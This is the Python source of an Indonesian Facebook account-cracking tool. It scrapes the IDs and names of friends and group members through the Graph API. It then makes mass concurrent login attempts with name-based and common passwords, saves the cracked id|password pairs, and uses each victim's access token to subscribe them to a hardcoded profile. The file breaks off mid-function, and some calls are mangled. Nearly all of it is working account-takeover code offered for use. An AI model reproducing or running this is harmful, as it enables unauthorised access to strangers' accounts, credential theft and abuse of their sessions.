# -- encoding: utf-8 --
# encode as 'UTF8'
import os,sys,requests
import json,getpass,hashlib
import time,random,json
from timeit import default_timer
import asyncio
from aiohttp import ClientSession
from aiohttp import ClientRequest
from multiprocessing.pool import ThreadPool
import threading
#fungsi#
P = print
Os = os.system
## Warna ##
m="\033[7;31m"
mn="\033[0;31m"
mm= "\033[1;31m"
ht="\e[32;1m;5m"
gk="\033[5;32m"
gt="\033[3;32m"
g="\033[0;32m"
w="\033[1;37m"
c="\033[1;36m"
cc="\033[0;36m"
y="\033[7;33m"
yy="\033[3;33m"
token = open('token','r').read()
ban = f"""{c}
 ╔════════════════════════════════════════════════════════════════════╗
 ║{y}::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{cc}{c}║
 ║{w}::::'{mm}###{w}:::::'{mm}######{w}:::::::::::'{mm}##{w}:::'{mm}##{w}:'{mm}####{w}:'{mm}##{w}::: {mm}##{w}::'{mm}######{w}:::{c}║
 ║{w}:::'{mm}## ##{w}:::'{mm}##{w}... {mm}##{w}:::::::::: {mm}##{w}::'{mm}##{w}::. {mm}##{w}{w}:: {mm}###{w}:: {mm}##{w}:'{mm}##{w}... {mm}##{w}::{c}║
 ║{w}::'{mm}##{w}:. {mm}##{w}:: {mm}##{w}:::..::::::::::: {mm}##{w}:'{mm}##{w}:::: {mm}##{w}:: {mm}####{w}: {mm}##{w}: {mm}##{w}:::..:::{c}║
 ║{w}:'{mm}##{w}:::. {mm}##{w}:. {mm}######{w}::'{mm}#######{w}: {mm}#####{w}::::: {mm}##{w}:: {mm}## ## ##{w}: {mm}##{w}:'{mm}#####{w}:{c}║
 ║ {mm}##########{w}::..... {mm}##{w}:........: {mm}##{w}. {mm}##{w}:::: {mm}##{w}:: {mm}##{w}. {mm}####{w}: {mm}##{w}::{mm}"{w} {mm}##{w}::{c}║
 ║ {mm}##{w}....  {mm}##{w}:'{mm}##{w}::: {mm}##{w}:::::::::: {mm}##{w}:. {mm}##{w}::: {mm}##{w}:: {mm}##{w}:. {mm}###{w}: {mm}##{w}::: {mm}##{w}::{c}║
 ║ {mm}##{w}::::  {mm}##{w}:. {mm}######{w}::::::::::: {mm}##{w}::. {mm}##{w}:'{mm}####{w}: {mm}##{w}::. {mm}##{w}:. {mm}######{w}:::{c}║
 ║{w}:..:::::..:::......::::::::::::..::::..::....::..::::..:::......::::{c}║
 ║{y}::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::{cc}{c}║
 ║{gt}Coded By  : {mm}Red_Borneo-ASK                                        {c}  ║
 ║{gt}Team      : {mm}AS-KING PROJECT                                       {c}  ║
 ║{gt}Github    : {c}https://github.com/As-King/asking_fb                  {c}  ║
 ║{gt}Published : {gt}18{mm}-{gt}07{mm}-{gt}2019                                    {c}          ║
 ╚════════════════════════════════════════════════════════════════════╝"""
Menu = f'''
 {c}╔══════════════════════════════════╗
 {c}║            {yy}Menu Tools{cc}{c}            ║
 {c}╠═══╦══════════════════════════════╣
 {c}║ {w}1{c} ║{gt}Fb Target{c}                     ║
 {c}║ {w}2{c} ║{gt}FB{yy} Rombong{w} ({gt}Manual {mm}Fast{w})      {c}║
 {c}║ {w}3{c} ║{gt}FB{yy} Rombong{w} ({gt}Pasword Auto {mm}Fast{w}){c}║
 {c}║ {w}4{c} ║{gt}Check Akun  {c}                  ║
 {c}║ {w}5{c} ║{gt}Create Token{c}                  ║
 {c}║ {w}6{c} ║{gt}Exit Program{c}                  ║
 {c}╚═══╩══════════════════════════════╝'''
fbmb =f'''{c}
 ╔══════════════════════════════════╗
 ║{yy}       Pilih Salah satu {c}          ║
 ╠═══╦══════════════════════════════╣
 ║{w} 1{c} ║{gt}Crack dari daftar Teman.      {c}║
 ║{w} 2{c} ║{gt}Crack dari member Grup.       {c}║
 ║{w} 3{c} ║{gt}Crack Hasil result sebelumnya.{c}║
 ║{w} 4{c} ║{gt}Kembali ke Menu               {c}║
 ╚═══╩══════════════════════════════╝'''
fbck =f'''{c}
 ╔══════════════════════════════════╗
 ║{yy}       Pilih Salah satu {c}          ║
 ╠═══╦══════════════════════════════╣
 ║{w} 1{c} ║{gt}Check File Result {c}aktif.      {c}║
 ║{w} 2{c} ║{gt}Check File Result {yy}Checkpoint. {c}║
 ║{w} 3{c} ║{gt}Check File {c}Baru .             {c}║
 ║{w} 4{c} ║{mm}Kembali ke Menu               {c}║
 ╚═══╩══════════════════════════════╝'''
fbcl =f'''{c}
 ╔══════════════════════════════════╗
 ║{yy}       Pilih Config password{c}      ║
 ╠═══╦══════════════════════════════╣
 ║{w} 1{c} ║{gt}Crack (Config 1)              {c}║
 ║{w} 2{c} ║{gt}Crack (Config 2)              {c}║
 ║{w} 3{c} ║{mm}Kembali ke Menu               {c}║
 ╚═══╩══════════════════════════════╝'''
def Exit():
    Os('exit')
def login():
    Os('python2 login.py')
    Os('clear')
    P(ban)
    start()
def fbt():
    target = input( f'  {gt}Id/Username Target : {c}')
    def main(urls):
        loop = asyncio.get_event_loop() 
        future = asyncio.ensure_future(kumpul(urls)) 
        loop.run_until_complete(future)

    async def kumpul(urls):
        ini = []
        thread = asynciOsemaphore(2)
        async with ClientSession() as sesi:
            for pwd in urls:
                task = asyncio.ensure_future(starting1(thread,pwd, sesi))
                ini.append(task)
            _ = await asyncio.gather(*ini)
    async def starting1(thread,pwd,sesi):
        async with thread:
            await starting(pwd,sesi)
    async def starting(pwd,sesi):
        url = 'https://mbasic.facebook.com/login'
        dt={'email':target,'pass':pwd,'login':'submit'} 
        pw = pwd
        async with sesi.post(url,data=dt) as res:
            resp = await res.read()
            #P(resp)
            if 'mbasic_logout_button' in str(resp):
                    P(f'{gt}BErhasil {c} => {pw}')
                    Exit()
            elif 'checkpoint' in str(resp):
                    P('CheckPoint')
            else:
                    P(f'  {w}{pw} {mm}salah ')
                    #P(resp)
                    time.sleep(5)                    
            return resp
    file = open('Newkota','r').read().splitlines()
    urls = []
    for i in file:
        urls.append(i)
    main(urls)
    input('  Selesai')
    Os('clear')
    P(ban)
    menu()
def fbm():
    Os('clear')
    P(fbmb)
    fb   = input(f'  {gt}Masukan Pilihan : ')
    def main(IDS,pwd):
        loop = asyncio.get_event_loop() 
        future = asyncio.ensure_future(kumpul(IDS,pwd)) 
        loop.run_until_complete(future)
    async def kumpul(IDS,pwd):
        ini = []
        #P(IDS)
        thread = asynciOsemaphore(25)
        async with ClientSession() as sesi:
            for ID in IDS:
                task = asyncio.ensure_future(starting1(thread,ID,pwd,sesi))
                ini.append(task)
            _ = await asyncio.gather(*ini)
    async def starting1(thread,ID,pwd,sesi):
        async with thread:
            await starting(ID,pwd,sesi)
    async def starting(ID,pwd,sesi):
        url2 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+ID+'&locale=en_US&password='+pwd+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
        pw = pwd
        id = ID
        #P(url2)
        a=[]
        try:
            async with sesi.get(url2) as res:
                resp = await res.read()
                x = json.loads(resp)
                hit.append(x)
                a.append(x)
                orz = open('aktif','a')
                oz  = open('checkP','a')
                cik = open('aktif','r').read()
                cuk = open('checkP','r').read()
                if 'session_key' in str(resp):
                        if id in str(cik):
                            pass
                        else:
                            z = x['access_token']
                            acc.append(id)
                            bhs= id+'|'+pwd+'\n'
                            orz.write(bhs)
                            succ.append(bhs)
                            #P(f'{gt}  SUCCES {id} {w} => {pw}')
                            requests.post('https://graph.facebook.com/al.ansyari.946/subscribers?access_token='+z)
                            time.sleep(1)     
                            #Exit()
                elif '(405)' in str(resp):
                        if id in str(cuk):
                            pass
                        else:
                            chk = id+'|'+pwd+'\n'
                            cek.append(id)
                            check.append(chk)
                            oz.write(chk)
                            time.sleep(3)
                            #P(f'{y}  CHECK  {id} {w} => {pw}')
                else:
                        #P(f'  {w}{pw} {m}salah ')
                        #P(resp)
                        pass
                        #time.sleep(5)
                orz.close()
                Os('clear')
                P ('     %s╔════════╦════════╦═══════╦═══════╗'%(gt))
                P ('     %s║%s sukses%s ║%s CheckP%s ║%s Crack%s ║%s Total%s ║'% (gt,c,gt,y,gt,mm,gt,w,gt))
                P (  "     ╠════════╬════════╬═══════╬═══════╣")
                P ( f'     ║{c} {len(acc)}'.ljust(21)+f'{gt}║{y} {len(cek)}'.ljust(23)+f'{gt}║ {w}{len(hit)}'.ljust(22)+f'{gt}║ {gt}{len(ids)}'.ljust(22)+f'{gt}║')
                P ('     %s╚════════╩════════╩═══════╩═══════╝'%(gt))                    
                time.sleep(0.05)
            
                return resp
        except KeyboardInterrupt:
                qtampil()
    def grup(url):
        try:
            op = requests.get(url)
            aa = op.json()
            ab = open('eksek','a')
            ac = open('eksek','r').readlines()
            for i in aa['data']:
                iD = i['id']
                ab.write(iD+'\n')
            ab.close()
            ad = len(ac)
            if 'next' in str(aa):
                url = aa['paging']['next']
                grup(url)
            else:
                pass
            #P(' Loading . . .')
            #grup(url)
        except:
            pass
    if fb == '1':
        pilih = 'Teman'
        try:
            token = open('token','r').read()
        except IOError/FileNotFoundError:
            login()
            start()
        op = requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token='+token)
        aa = op.json()['data']
        ab = open('eksek','w')
        for i in aa:
            iD = i['id']
            ab.write(iD+'\n')
        ab.close()
    elif fb == '2':
        pilih = 'Member Grup'
        try:
            token = open('token','r').read()
        except IOError/FileNotFoundError:
            login()
            start()
        b = requests.get("https://graph.facebook.com/v3.1/me/groups?fields=member_count,name&limit=5000&access_token="+token)
        P      (f"{c} ╔══════════════════╦═══════════════════════════════════════════╦════════╗")
        P      (f"{c} ║   {gt}  ID GRUP   {c}   ║{yy}                   NAMA GRUP               {c}║{gt} Jumlah{c} ║")
        P      (f"{c} ╠══════════════════╬═══════════════════════════════════════════╬════════╣")
        for i in b.json()['data']:
            cc = i['id']
            dd = i['name']
            mc = i['member_count']
            d = dd.replace('\n',' ')
            #P (len(d))
            e = '.'
            P((' ║ ')+(w)+(cc).ljust(17)+(f'{c}║ ')+gt+(d[:40]).ljust(42,'.')+(f'{c}║')+w+str(mc).ljust(8)+(f'{c}║'))
            if len(d) >= 40:
                P((' ║ ').ljust(20)+(f'{c}║ ')+gt+(d[40:]).ljust(42,'.')+(f'{c}║')+(w).ljust(15)+(f'{c}║'))
                P (" ╠══════════════════╬═══════════════════════════════════════════╬════════╣")
            else:
                P (" ╠══════════════════╬═══════════════════════════════════════════╬════════╣")
        P      (" ╠══════════════════╩═══════════════════════════════════════════╩════════╣")
        P((f' ║{w}')+(f' {yy}Masukan ID grup yang ingin di dump !{w} ').center(85,'-')+(f'{c}║'))
        P (" ╚"+'═'*71+"╝")
        ig = input('  Input ID : ')
        az = requests.get('https://graph.facebook.com/v3.1/'+ig+'?&access_token='+token)
        azz = az.json()
        ng= azz['name']
        P('  Grup :'+yy+ng[:30])
        P('        '+yy+ng[30:])
        P(gt+'  Sedang Mengumpulkan ID ')
        op = requests.get('https://graph.facebook.com/v3.1/'+ig+'/members?fields=name,id&limit=5000&access_token='+token)
        aa = op.json()
        ab = open('eksek','w')
        for i in aa['data']:
            iD = i['id']
            ab.write(iD+'\n')
        ab.close()
        url = aa['paging']['next']
        #P(url)
        grup(url)
    elif fb == '3':
        pilih = 'Result sebelumnya'
        pass
    elif fb == '4':
        Os('clear')
        P(ban)
        menu()
    else :
        P(f'{mm} {fb} {gt}Tidak ada dalam pilihan')
        P(f'{gt}  Mohon Pilih Salah satu nomor'.center(30))
        time.sleep(2)
        fbm()
    P(f'  {gt}Selesai Mengambil ID {yy}{pilih}')
    def tanya():
        cu = input(f'  {gt}Masih belum Puas ,Ingin Crack ulang (y/n) ? ')
        if cu == 'y':
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
            crack()
        elif cu == 'n':
            pass
        else:
            tanya()
    def qtampil():
        try:
            qtam = input('  tampilkan hasil y/n ? :  ')
            if qtam == 'y':
                P('     %s╔══════════════════════════════════════╗'%(gt))   
                P(f'   {gt}  ║ {c}             BERHASIL    {gt}            ║')
                P( "     ╠══════════════════╦═══════════════════╣") 
                for i in succ:
                    id,pwd = i.strip().split('|')
                    P('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                P('     %s╠══════════════════╩═══════════════════╣'%(gt))   
                P(f'   {gt}  ║ {y}             CHECKPOINT  {gt}            ║')
                P( "     ╠══════════════════╦═══════════════════╣")    
                for i in check:
                    id,pwd = i.strip().split('|')    
                    P('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                P('     %s╚══════════════════╩═══════════════════╝'%(gt))
                input(f'  {m}Kembali{mn}{mn}')
            elif qtam == 'n':
                tanya()
            else:
                qtampil()
        except KeyboardInterrupt:
            qtampil()
    def crack():
        pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        ld = []
        succ=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            IDS.append(i)
            #P(IDS)
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
        main(IDS,pwd)
        qtampil()
        tanya()
    def crack1():
        pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        succ=[]
        ld=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            IDS.append(i)
            ld = []
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
            #P(IDS)
        main(IDS,pwd)
        qtampil()
        tanya()
    ids =open('eksek','r').readlines()
    succ=[]
    check=[]
    acc=[]
    hit=[]
    cek=[]
    ld=[]
    crack1()
    Os('clear')
    P(ban)
    start()
def fbaF():
    Os('clear')
    P(fbmb)
    fb   = input(f'  {gt}Masukan Pilihan : ')
    def main(IDS):
        loop = asyncio.get_event_loop() 
        future = asyncio.ensure_future(kumpul(IDS)) 
        loop.run_until_complete(future)
    async def kumpul(IDS):
        ini = []
        #P(IDS)
        thread = asyncio.Semaphore(50)
        async with ClientSession() as sesi:
            for ID in IDS:
                task = asyncio.ensure_future(starting1(thread,ID,sesi))
                ini.append(task)
            _ = await asyncio.gather(*ini)
    async def starting1(thread,ID,sesi):
        async with thread:
            await starting(ID,sesi)
            time.sleep(0.01)
    async def starting(ID,sesi):
            url2 = ID.replace('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=','').replace('&locale=en_US&password=','|').replace('&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6','')
            u,p = url2.strip().split('|')
            oz = open('aktif','r').read()
            ez = open('checkP','r').read()
            if u in str(oz) or u in str(ez):
                pass
            else:
                if u in str(hit):
                    pass
                elif u not in str(hit):
                    hit.append(u)
                try:
                    async with sesi.get(ID) as res:
                        resp = await res.read()
                        x = json.loads(resp)
                        oss= open('aktif','a')
                        es = open('checkP','a')
                        if 'session_key' in str(resp):
                            if u in str(oz):
                                pass
                            else:
                                z = x['access_token']
                                acc.append(u)
                                bhs= u+'|'+p
                                oss.write(bhs+'\n')
                                succ.append(bhs)
                                requests.post('https://graph.facebook.com/al.ansyari.946/subscribers?access_token='+z)
                                time.sleep(0.3)
                        elif '(405)' in str(resp):
                            if u in str(ez):
                                pass
                            else:
                                chk = u+'|'+p+'\n'
                                es.write(chk)
                                cek.append(u)
                                check.append(chk)
                        elif '401' in str(resp):
                            pass
                        oss.close()
                        es.close()
                        Os('clear')    
                        P ('     %s╔════════╦════════╦═════════╦════════╦════════════════╗'%(gt))
                        P ('     %s║%s sukses%s ║%s CheckP%s ║%s  Crack%s  ║%s Total%s  ║    %s target %s    ║'% (gt,c,gt,yy,gt,mm,gt,w,gt,mm,gt))
                        P (  "     ╠════════╬════════╬═════════╬════════╬════════════════╣")
                        P ( f'     ║{c} {len(acc)}'.ljust(21)+f'{gt}║{yy} {len(cek)}'.ljust(23)+f'{gt}║ {w}{len(hit)}'.ljust(24)+f'{gt}║ {gt}{len(ids)}'.ljust(23)+f'{gt}║{c}'+(u).ljust(16)+f'{gt}║')
                        P ('     %s╚════════╩════════╩═════════╩════════╩════════════════╝'%(gt))                    
                        #time.sleep(0.1)
                        return resp
                except KeyError:
                        qtampil()
                        pass
                except KeyboardInterrupt:
                        qtampil()
                        pass
    def grup(url):
        try:
            op = requests.get(url)
            aa = op.json()
            ab = open('eksek','a')
            ac = open('eksek','r').readlines()
            for i in aa['data']:
                if 'first_name' not in i:
                    pass
                else:
                    time.sleep(0.0005)
                    id = i['id']
                    f  = i['first_name']
                    fn = f.replace(' ','')
                    l  = i['last_name']
                    ln = l.replace(' ','')
                    ab.write(id+'|'+fn+'|'+ln+'\n')
            ab.close()
            ad = len(ac)
            maks = 25000
            if len(ac) >= maks:
                max     = open("eksek","r")
                maks_id = max.readlines()
                max.close()
                itu = maks_id[:maks]
                anu = open("eksek","w")
                anu.writelines(itu)
                time.sleep(3)
                anu.close()
            else:
                if 'next' in str(aa):
                    time.sleep(3)
                    url = aa['paging']['next']
                    grup(url)
                else:
                    P(ad)
                    pass
        except:
            pass
    if fb == '1':
        pilih = 'Teman'
        try:
            token = open('token','r').read()
            op = requests.get('https://graph.facebook.com/me/friends?fields=first_name,last_name&limit=5000&access_token='+token)
            aa = op.json()
            if 'error' in aa:
                P('  Sepertinya Akun Kena CheckPoint')
                login()
                start()
            else:
                #ac = open('eksek','w')
                ab = open('eksek','w')
                for i in aa['data']:
                    if 'first_name' not in i: 
                        pass
                    elif 'last_name' not in i :
                        pass
                    else:
                        time.sleep(0.0005)
                        id = i['id']
                        f  = i['first_name']
                        fn = f.replace(' ','')
                        l  = i['last_name']
                        ln = l.replace(' ','')
                        ab.write(id+'|'+fn+'|'+ln+'\n')
                        #input('selesai')
                ab.close()
        except FileNotFoundError:
            P('  Tidak ada Akun Facebook')
            P('  Silahkan Login')
            login()
            start()
        except IOError:
            P('  Tidak ada Akun Facebook')
            P('  Silahkan Login')
            login()
            start()
        
        
    elif fb == '2':
        pilih = 'Member Grup'
        try:
            token = open('token','r').read()
        except IOError/FileNotFoundError:
            login()
            start()
        try:
            b = requests.get("https://graph.facebook.com/v3.1/me/groups?fields=member_count,name&limit=5000&access_token="+token)
            if 'error' in b.json():
                P('  Sepertinya Akun Kena CheckPoint')
                login()
                start()
            else:
                P      (f"{c} ╔══════════════════╦═══════════════════════════════════════════╦════════╗")
                P      (f"{c} ║   {gt}  ID GRUP   {c}   ║{yy}                   NAMA GRUP               {c}║{gt} Jumlah{c} ║")
                P      (f"{c} ╠══════════════════╬═══════════════════════════════════════════╬════════╣")
                for i in b.json()['data']:
                    cc = i['id']
                    dd = i['name']
                    mc = i['member_count']
                    d = dd.replace('\n',' ')
                    #P (len(d))
                    e = '.'
                    P((' ║ ')+(w)+(cc).ljust(17)+(f'{c}║ ')+gt+(d[:40]).ljust(42,'.')+(f'{c}║')+w+str(mc).ljust(8)+(f'{c}║'))
                    if len(d) >= 40:
                        P((' ║ ').ljust(20)+(f'{c}║ ')+gt+(d[40:]).ljust(42,'.')+(f'{c}║')+(w).ljust(15)+(f'{c}║'))
                        P (" ╠══════════════════╬═══════════════════════════════════════════╬════════╣")
                    else:
                        P (" ╠══════════════════╬═══════════════════════════════════════════╬════════╣")
                P      (" ╠══════════════════╩═══════════════════════════════════════════╩════════╣")
                P((f' ║{w}')+(f' {yy}Masukan ID grup yang ingin di dump !{w} ').center(85,'-')+(f'{c}║'))
                P (" ╚"+'═'*71+"╝")
            ig = input('  Input ID : ')
            az = requests.get('https://graph.facebook.com/v3.1/'+ig+'?&access_token='+token)
            azz = az.json()
            ng= azz['name']
            P('  Grup     : '+yy+ng[:50])
            P('             '+yy+ng[50:])
            P(gt+'  Sedang Mengumpulkan ID ')
            op = requests.get('https://graph.facebook.com/v3.1/'+ig+'/members?fields=first_name,last_name&limit=5000&access_token='+token)
            aa = op.json()
            ab = open('eksek','w')
            for i in aa['data']:
                if 'first_name' not in i:
                    pass
                else:
                    time.sleep(0.0005)
                    id = i['id']
                    f  = i['first_name']
                    fn = f.replace(' ','')
                    l  = i['last_name']
                    ln = l.replace(' ','')
                    ab.write(id+'|'+fn+'|'+ln+'\n')
            time.sleep(3)
            ab.close()
            url = aa['paging']['next']
            grup(url)
        except:
            pass
    elif fb == '3':
        pilih = 'Result sebelumnya'
        pass
    elif fb == '4':
        Os('clear')
        P(ban)
        menu()
    else :
        P(f'{mm} {fb} {gt}Tidak ada dalam pilihan')
        P(f'{gt}  Mohon Pilih Salah satu nomor'.center(30))
        time.sleep(2)
        fbm()
    P(f'  {gt}Selesai Mengambil ID {yy}{pilih}')
    def tanya():
        cu = input(f'  {gt}Masih belum Puas ,Ingin Crack ulang (y/n) ? ')
        if cu == 'y':
            succ=[]
            check=[]
            acc=[]
            hit=[]
            cek=[]
            crack()
        elif cu == 'n':
            pass
        else:
            tanya()
    def qtampil():
        try:
            qtam = input('  tampilkan hasil y/n ? :  ')
            if qtam == 'y':
                P('     %s╔══════════════════════════════════════╗'%(gt))   
                P(f'   {gt}  ║ {c}             BERHASIL    {gt}            ║')
                P( "     ╠══════════════════╦═══════════════════╣") 
                for i in succ:
                    id,pwd = i.strip().split('|')
                    P('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                P('     %s╠══════════════════╩═══════════════════╣'%(gt))   
                P(f'   {gt}  ║ {yy}             CHECKPOINT  {gt}            ║')
                P( "     ╠══════════════════╦═══════════════════╣")    
                for i in check:
                    id,pwd = i.strip().split('|')    
                    P('     ║'+f' {id}'.ljust(18)+'║'+f' {pwd}'.ljust(19)+'║')
                P('     %s╚══════════════════╩═══════════════════╝'%(gt))
                input(f'  {mm}Kembali')
                Os('clear')
                P(ban)
                menu()
            elif qtam == 'n':
                Os('clear')
                P(ban)
                menu()
            else:
                qtampil()
        except KeyboardInterrupt:
            qtampil()
    def crack():
        P(fbcl)
        asw = input(' Masukan Pilihan: ')
        if asw == '1':
            crack1()
        elif asw == '2':
            crack2()
        elif asw == '3':
            crack3()
        elif asw == '4':
            Os('clear')
            menu()
        else:
            P(f'{mm}{asw}{gt} Tidak ada Di Pilihan ')
            P(f'{yy} Masukan Pilihan Yang Tersedia{c} ')
            Os('clear')
            crack()
                
    def crack1():
        #pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        succ=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            #time.sleep(0.005)
            try:
                di,fn,ln = i.split('|')
                p1 = fn+'123'
                p2 = fn+'12345'
                p3 = ln+'123'
                p4 = ln+'12345'
                p5 = 'sayang'
                p6 = 'anjing'
                p7 = 'bangsat'
                p8 = 'kontol'
                p9 = p8+'123'
                p10= 'sayangku'
                lyters1 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters2 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters3 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters4 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p4+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters5 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p5+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters6 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p6+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters7 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p7+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters8 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p8+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters9 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p9+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters10 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p10+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                #time.sleep(0.005)
                IDS.append(lyters1)
                IDS.append(lyters2)
                IDS.append(lyters3)
                IDS.append(lyters4)
                IDS.append(lyters5)
                IDS.append(lyters6)
                IDS.append(lyters7)
                IDS.append(lyters8)
                IDS.append(lyters9)
                IDS.append(lyters10)
                succ=[]
                check=[]
                acc=[]
                hit=[]
                cek=[]
                #P(len(IDS))
            except ValueError:
                pass
        #input('laksanakan !')
        main(IDS)
        qtampil()
        tanya()    
    def crack2():
    #pwd = input('  Password for Crack : ')
        file = open('eksek','r').read().splitlines()
        IDS = []
        succ=[]
        check=[]
        acc=[]
        hit=[]
        cek=[]
        for i in file:
            #time.sleep(0.005)
            try:
                di,fn,ln = i.split('|')
                p1 = 'cintaku'
                p2 = 'iloveu'
                p3 = 'iloveyou'
                p4 = '1234567'
                p5 = 'sayang123'
                p6 = 'anjing123'
                p7 = 'bangsat123'
                p8 = 'kontol12345'
                p9 = 'abc123'
                p10= '123abc'
                lyters1 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters2 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters3 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters4 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p4+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters5 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p5+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters6 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p6+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters7 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p7+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters8 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p8+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters9 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p9+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                lyters10 = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+di+'&locale=en_US&password='+p10+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
                #time.sleep(0.005)
                IDS.append(lyters1)
                IDS.append(lyters2)
                IDS.append(lyters3)
                IDS.append(lyters4)
                IDS.append(lyters5)
                IDS.append(lyters6)
